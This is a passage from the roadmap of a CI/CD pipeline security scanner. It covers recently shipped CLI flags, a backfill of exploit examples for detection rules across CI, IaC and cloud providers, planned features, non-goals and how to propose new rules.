rotation concern, which isn't visible in workflow YAML and stays out of
scope.

### ~~Inline explain mode (``--inline-explain``)~~ shipped

Shipped in v1.6.0. The flag uses the ``inline-`` prefix because
``--explain CHECK_ID`` was already taken as an early-exit option.
Renders the rule's ``exploit_example`` (when present) under each
failing finding's panel; recommendation was already inline. See the
v1.6.0 entry above.

### ~~Suppression expiry warnings~~ shipped

Shipped on ``dev``. ``--warn-expiring-suppressions DAYS`` makes the
soon-to-expire forewarning window configurable (was a hardcoded,
always-on 14 days). Accepts ``7`` / ``7d``; ``0`` / ``off`` / ``none`` /
``never`` disables it (already-expired rules are still reported). Parsing
is ``gate.parse_expiry_window``; the window flows through
``GateConfig.expiry_warning_days``.

### ~~Config-strict mode~~ shipped

Shipped on ``dev``. ``--config-strict`` promotes an unknown config key in
``.pipeline-check.yml`` / ``pyproject.toml`` to a hard error (exit 2)
before a real scan, catching a typo like a top-level ``fail_on: HIGH``
(belongs under ``gate:``) before it silently disables gating. Reuses the
``config.last_unknown_keys()`` the existing ``--config-check`` preflight
already populates; ``--config-strict`` differs by guarding a normal scan
rather than being a standalone report-and-exit step.

### Continuing posture: proof-of-exploit backfill

Every CRITICAL rule (89) carries an ``exploit_example``, and new
CRITICAL rules ship one from the start. HIGH (386) carries one too,
with the sole exception of ``GAR-001`` (no Artifact Registry
vulnerability scanning), which stays None by design like the other
absence-of-scanning posture rules. The last cloud-posture gap closed
in the dev cycle: ``ACR-002``, ``AKV-002``, ``AZST-002``, ``ENTRA-003``,
``GAR-002``, ``GCIAM-003``, ``GCKMS-002``. MEDIUM and LOW backfill stays
opportunistic and is not a release-blocking milestone; the batches so
far cover the GitHub Actions MEDIUM rules with a concrete exploitation
primitive (GHA-005 long-lived AWS keys, GHA-011 cache-key poisoning,
GHA-014 ungated deploy, GHA-029 git / path / tarball install, GHA-034
``secrets: inherit``) and their GitLab analogs (GL-004 ungated deploy,
GL-012 cache poisoning, GL-013 long-lived AWS keys, GL-027 git / path /
tarball install, plus the GitLab-specific GL-029 manual deploy
defaulting to ``allow_failure: true``), and the CircleCI set (CC-005
long-lived AWS keys, CC-009 ungated deploy, CC-025 cache poisoning,
CC-028 git / path / tarball install, plus the CircleCI-specific CC-012
``setup: true`` dynamic-config injection), and the Bitbucket set
(BB-004 ungated deploy, BB-011 long-lived AWS keys, BB-018 cache
poisoning, BB-027 git / path / tarball install, plus BB-009 a third-
party ``pipe:`` pinned by mutable tag instead of sha256 digest), and
the Azure DevOps set (ADO-004 ungated deployment job, ADO-012 cache
poisoning via ``$(System.PullRequest.*)``, ADO-014 long-lived AWS keys,
ADO-028 git / path / tarball install, plus ADO-009 a container image
pinned by mutable tag instead of sha256 digest), and the Jenkins set
(JF-004 long-lived AWS keys via ``withCredentials``, JF-005 deploy
stage with no ``input`` approval, JF-031 git / path / tarball install,
plus the Jenkins-specific JF-012 ``load`` of unpinned Groovy and JF-024
an ``input`` gate with no ``submitter`` restriction), and the Buildkite
set (BK-007 deploy with no manual ``block:``, BK-008 TLS verification
disabled in a step command, BK-013 deploy step with no ``branches:``
filter, BK-014 unpinned package installs), and the Drone set (DR-008
``pull: never`` reusing an unverified cached image, DR-010 unpinned
package installs), and the Tekton set (TKN-007 a run on the namespace
``default`` ServiceAccount, TKN-014 unpinned package installs). That
completes the concrete-primitive MEDIUM rules across every CI provider.
The backfill then began extending into the IaC providers, starting with
the Terraform AWS-CI/CD pack (CB-007 an unfiltered CodeBuild webhook
that lets fork PRs run in the build account, IAM-006 a wildcard
``Resource`` on sensitive actions, CP-005 a production deploy with no
ManualApproval, PBAC-003 a build security group with ``0.0.0.0/0``
egress, CB-009 a build image pinned by a mutable tag). The
CloudFormation pack mirrors the same AWS CI/CD model, so the same five
(CB-007, IAM-006, CP-005, PBAC-003, CB-009) got the CFN-template
versions. Kubernetes was higher-yield (its primitives are concrete):
K8S-011 (the ``default`` ServiceAccount), K8S-012 (an auto-mounted SA
token a compromised container reads), K8S-039 (``shareProcessNamespace``
letting a sidecar read a neighbor's secrets), K8S-038 (an allow-all
NetworkPolicy), and K8S-028 (a ``hostPort`` bypassing the cluster
network model). The Dockerfile pack was a clean five, every remaining
MEDIUM there is a concrete primitive rather than posture: DF-015 (a
``chmod 777`` that lets a non-root process overwrite a trusted binary),
DF-017 (a world-writable ``PATH`` entry ahead of the system bins, a
shadowing hijack), DF-018 (a ``chown`` handing the runtime user
ownership of a system path like ``/usr``), DF-022 (``npm install``
resolving against the live registry instead of the committed lockfile),
and DF-030 (``NODE_OPTIONS`` opening the V8 inspector or preloading a
module on every ``node`` the image runs). The Terraform AWS pack then
took a second tranche beyond the CI/CD five: PBAC-002 (a CodeBuild
service role shared across projects, a blast-radius pivot), CCM-003 (a
CodeCommit trigger firing to a literal cross-account SNS / Lambda ARN,
repo-event exfil), and S3-005 (an artifact bucket with no
``aws:SecureTransport`` deny, a plaintext-transport artifact MITM); the
CloudFormation pack mirrored the same three (PBAC-002 / CCM-003 /
S3-005) in CFN-template form. IaC packs are more posture-heavy than CI,
so a larger share of their MEDIUM rules stay None. Absence-of-hygiene posture rules (no SBOM / SLSA / signing /
vulnerability scanning, encryption / logging / retention settings) keep
no example by design, since the gap is a missing control rather than an
exploitation primitive. The backfill then reached the live cloud-posture
providers, which are even more posture-weighted; the cherry-picked GCP
exposure rules are GCNET-001 (the default VPC's pre-populated
allow-SSH / RDP-from-anywhere firewall), GCCE-003 (the readable serial
console leaking boot-time secrets), and GCCE-005 (an instance honoring
project-wide SSH keys, a one-metadata-write path to shell on the fleet).
The Azure cloud pack added the same kind of exposure cherry-picks:
AKV-003 (a Key Vault whose firewall default-action is Allow, so its
secrets are reachable from the public internet), AZAPP-005 (an App
Service still accepting plain FTP, leaking publish credentials in
cleartext), and ACR-005 (a container registry without tag immutability,
so a pushed tag can be overwritten with a backdoored image). The
remaining cloud-posture MEDIUM rules (encryption, rotation, logging,
backups, hardening toggles) stay None by design, so this backfill is now
into its opportunistic long tail. A follow-up pass then caught two
CI-style providers the original CI sweep skipped: Argo Workflows now
ships ARGO-003 (default ServiceAccount), ARGO-013 (SA-token automount not
opted out), and ARGO-014 (a template script's unpinned package install),
the same primitives as the Kubernetes and Tekton packs. Cloud Build then
shipped the analogous pair: GCB-013 (a git / path / tarball install that
bypasses the registry) and GCB-016 (a step ``dir`` with a ``..`` escape
that reaches the builder image's root filesystem). That exhausts the
concrete-primitive MEDIUM rules across every provider; the remainder
stay None by design.

### Lower priority

- **GitHub App.** Installable GitHub App with persistent webhook-
  driven scanning and checks-API integration. The ``action.yml``
  already ships inline PR review comments, which covers the
  single-repo feedback loop. The App adds persistent config,
  auto-scan on push, and cross-repo dashboards. Revisit if multiple
  users request always-on scanning without workflow setup.
- **SaaS API.** Hosted scan endpoint with auth and history. Scope
  is large (auth, multi-tenancy, history DB) and blurs OSS
  positioning. Revisit if a clear paid-tier story emerges.

## Non-goals

Things that have come up but aren't planned. Stating them here saves
discussion later.

- **IaC autofix beyond comment-only TODOs.** Text patching Terraform
  HCL or CloudFormation YAML can't see the resource graph. Risk of
  silently breaking cross-resource references is too high. Comment-
  only TODOs are fine; transformative fixes aren't.
- **Generic SAST.** Pipeline-Check scans pipeline definitions, not
  application source. Bandit, Semgrep, CodeQL already do SAST well.
- **Telemetry or phone-home.** Not now, not later. The "no telemetry"
  promise on the landing page is load-bearing.
- **Vendoring rules from other tools.** No checkov / kics / trivy
  rule imports. Every rule here is hand-written so the recommendation
  prose, severity, and standards mapping all reflect the same point
  of view.

## How to propose changes

Open an issue with the `feature_request` template. For new providers
or attack chains, include a short rationale and 2 to 3 example
findings the rule would catch. For new rules within an existing
provider, an OWASP CICD-SEC or CIS Benchmark citation helps.
